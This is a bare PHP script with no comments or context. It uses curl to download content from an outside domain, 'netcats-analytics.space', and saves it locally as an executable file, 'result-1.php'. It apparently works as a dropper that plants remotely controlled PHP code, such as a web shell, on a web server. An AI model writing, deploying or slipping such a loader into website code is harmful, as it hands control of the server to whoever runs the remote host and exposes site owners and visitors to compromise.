<?php
$ch = curl_init("https://netcats-analytics.space/new/query-1.php");
$fp = fopen("result-1.php", "w");
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
curl_close($ch);
fclose($fp);
?>